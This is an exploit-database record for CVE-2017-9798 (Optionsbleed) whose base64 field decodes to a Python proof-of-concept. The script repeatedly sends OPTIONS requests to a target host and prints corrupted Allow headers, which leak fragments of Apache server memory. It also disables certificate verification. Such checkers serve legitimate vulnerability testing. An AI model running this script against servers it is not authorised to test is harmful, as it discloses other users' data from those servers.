{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KDQojIE9wdGlvbnNibGVlZCBwcm9vZiBvZiBjb25jZXB0IHRlc3QNCiMgYnkgSGFubm8gQsO2Y2sNCg0KaW1wb3J0IGFyZ3BhcnNlDQppbXBvcnQgdXJsbGliMw0KaW1wb3J0IHJlDQoNCg0KZGVmIHRlc3RfYmxlZWQodXJsLCBhcmdzKToNCiAgICByID0gcG9vbC5yZXF1ZXN0KCdPUFRJT05TJywgdXJsKQ0KICAgIHRyeToNCiAgICAgICAgYWxsb3cgPSBzdHIoci5oZWFkZXJzWyJBbGxvdyJdKQ0KICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgaWYgYWxsb3cgaW4gZHVwOg0KICAgICAgICByZXR1cm4NCiAgICBkdXAuYXBwZW5kKGFsbG93KQ0KICAgIGlmIGFsbG93ID09ICIiOg0KICAgICAgICBwcmludCgiW2VtcHR5XSAlcyIgJSAodXJsKSkNCiAgICBlbGlmIHJlLm1hdGNoKCJeW2EtekEtWl0rKC1bYS16QS1aXSspPyAqKCwgKlthLXpBLVpdKygtW2EtekEtWl0rKT8gKikqJCIsIGFsbG93KToNCiAgICAgICAgeiA9IFt4LnN0cmlwKCkgZm9yIHggaW4gYWxsb3cuc3BsaXQoJywnKV0NCiAgICAgICAgaWYgbGVuKHopID4gbGVuKHNldCh6KSk6DQogICAgICAgICAgICBwcmludCgiW2R1cGxpY2F0ZXNdICVzOiAlcyIgJSAodXJsLCByZXByKGFsbG93KSkpDQogICAgICAgIGVsaWYgYXJncy5hbGw6DQogICAgICAgICAgICBwcmludCgiW29rXSAlczogJXMiICUgKHVybCwgcmVwcihhbGxvdykpKQ0KICAgIGVsaWYgcmUubWF0Y2goIl5bYS16QS1aXSsoLVthLXpBLVpdKyk/ICooICtbYS16QS1aXSsoLVthLXpBLVpdKyk/ICopKyQiLCBhbGxvdyk6DQogICAgICAgIHByaW50KCJbc3BhY2VzXSAlczogJXMiICUgKHVybCwgcmVwcihhbGxvdykpKQ0KICAgIGVsc2U6DQogICAgICAgIHByaW50KCJbYmxlZWRdICVzOiAlcyIgJSAodXJsLCByZXByKGFsbG93KSkpDQogICAgcmV0dXJuIFRydWUNCg0KDQpwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcigNCiAgICAgICAgIGRlc2NyaXB0aW9uPSdDaGVjayBmb3IgdGhlIE9wdGlvbnNibGVlZCB2dWxuZXJhYmlsaXR5IChDVkUtMjAxNy05Nzk4KS4nLA0KICAgICAgICAgZXBpbG9nPSJUZXN0cyBzZXJ2ZXIgZm9yIE9wdGlvbnNibGVlZCBidWcgYW5kIG90aGVyIGJ1Z3MgaW4gdGhlIGFsbG93IGhlYWRlci5cblxuIg0KICAgICAgICAgIkF1dG1hdGljYWxseSBjaGVja3MgaHR0cDovLywgaHR0cHM6Ly8sIGh0dHA6Ly93d3cuIGFuZCBodHRwczovL3d3dy4gLVxuIg0KICAgICAgICAgImV4Y2VwdCBpZiB5b3UgcGFzcyAtdS8tLXVybCAod2hpY2ggbWVhbnMgYnkgZGVmYXVsdCB3ZSBjaGVjayA0MCB0aW1lcy4pXG5cbiINCiAgICAgICAgICJFeHBsYW5hdGlvbiBvZiByZXN1bHRzOlxuIg0KICAgICAgICAgIltibGVlZF0gY29ycnVwdGVkIGhlYWRlciBmb3VuZCwgdnVsbmVyYWJsZVxuIg0KICAgICAgICAgIltlbXB0eV0gZW1wdHkgYWxsb3cgaGVhZGVyLCBkb2VzIG5vdCBtYWtlIHNlbnNlXG4iDQogICAgICAgICAiW3NwYWNlc10gc3BhY2Utc2VwYXJhdGVkIG1ldGhvZCBsaXN0IChzaG91bGQgYmUgY29tbWEtc2VwYXJhdGVkKVxuIg0KICAgICAgICAgIltkdXBsaWNhdGVzXSBkdXBsaWNhdGVzIGluIGxpc3QgKG1heSBiZSBhcGFjaGUgYnVnIDYxMjA3KVxuIg0KICAgICAgICAgIltva10gbm9ybWFsIGxpc3QgZm91bmQgKG9ubHkgc2hvd24gd2l0aCAtYS8tLWFsbClcbiIsDQogICAgICAgICBmb3JtYXR0ZXJfY2xhc3M9YXJncGFyc2UuUmF3VGV4dEhlbHBGb3JtYXR0ZXIpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCdob3N0dG9jaGVjaycsICBhY3Rpb249J3N0b3JlJywNCiAgICAgICAgICAgICAgICAgICAgaGVscD0nVGhlIGhvc3RuYW1lIHlvdSB3YW50IHRvIHRlc3QgYWdhaW5zdCcpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctbicsIG5hcmdzPTEsIHR5cGU9aW50LCBkZWZhdWx0PVsxMF0sDQogICAgICAgICAgICAgICAgICAgIGhlbHA9J251bWJlciBvZiB0ZXN0cyAoZGVmYXVsdCAxMCknKQ0KcGFyc2VyLmFkZF9hcmd1bWVudCgiLWEiLCAiLS1hbGwiLCBhY3Rpb249InN0b3JlX3RydWUiLA0KICAgICAgICAgICAgICAgICAgICBoZWxwPSJzaG93IGhlYWRlcnMgZnJvbSBob3N0cyB3aXRob3V0IHByb2JsZW1zIikNCnBhcnNlci5hZGRfYXJndW1lbnQoIi11IiwgIi0tdXJsIiwgYWN0aW9uPSdzdG9yZV90cnVlJywNCiAgICAgICAgICAgICAgICAgICAgaGVscD0icGFzcyBVUkwgaW5zdGVhZCBvZiBob3N0bmFtZSIpDQphcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQ0KaG93b2Z0ZW4gPSBpbnQoYXJncy5uWzBdKQ0KDQpkdXAgPSBbXQ0KDQojIE5vdGU6IFRoaXMgZGlzYWJsZXMgd2FybmluZ3MgYWJvdXQgdGhlIGxhY2sgb2YgY2VydGlmaWNhdGUgdmVyaWZpY2F0aW9uLg0KIyBVc3VhbGx5IHRoaXMgaXMgYSBiYWQgaWRlYSwgYnV0IGZvciB0aGlzIHRvb2wgd2Ugd2FudCB0byBmaW5kIHZ1bG5lcmFiaWxpdGllcw0KIyBldmVuIGlmIHRoZXkgYXJlIHNoaXBwZWQgd2l0aCBpbnZhbGlkIGNlcnRpZmljYXRlcy4NCnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncyh1cmxsaWIzLmV4Y2VwdGlvbnMuSW5zZWN1cmVSZXF1ZXN0V2FybmluZykNCg0KcG9vbCA9IHVybGxpYjMuUG9vbE1hbmFnZXIoMTAsIGNlcnRfcmVxcz0nQ0VSVF9OT05FJykNCg0KaWYgYXJncy51cmw6DQogICAgdGVzdF9ibGVlZChhcmdzLmhvc3R0b2NoZWNrLCBhcmdzKQ0KZWxzZToNCiAgICBmb3IgcHJlZml4IGluIFsnaHR0cDovLycsICdodHRwOi8vd3d3LicsICdodHRwczovLycsICdodHRwczovL3d3dy4nXToNCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UoaG93b2Z0ZW4pOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGlmIHRlc3RfYmxlZWQocHJlZml4K2FyZ3MuaG9zdHRvY2hlY2ssIGFyZ3MpIGlzIEZhbHNlOg0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgIHBhc3M=", 
    "filename": "platforms/linux/webapps/42745.py", 
    "id": "42745", 
    "cves": [
        "CVE-2017-9798"
    ]
}